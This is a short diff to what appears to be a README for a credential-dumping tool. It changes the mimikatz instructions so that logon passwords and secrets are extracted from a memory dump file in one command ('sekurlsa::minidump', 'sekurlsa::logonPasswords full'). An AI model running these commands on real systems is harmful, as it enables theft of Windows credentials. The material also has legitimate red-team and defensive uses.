@@ -89,9 +89,8 @@ scripts/restore_signature <dumpfile>
 
 <b>mimikatz:</b>  
 To get the secrets simply run:
-```
-mimikatz # sekurlsa::minidump <dumpfile>
-mimikatz # sekurlsa::logonPasswords full
+```sh
+mimikatz.exe "sekurlsa::minidump <dumpfile>" "sekurlsa::logonPasswords full" exit
 ```
 
 <b>pypykatz:</b>  
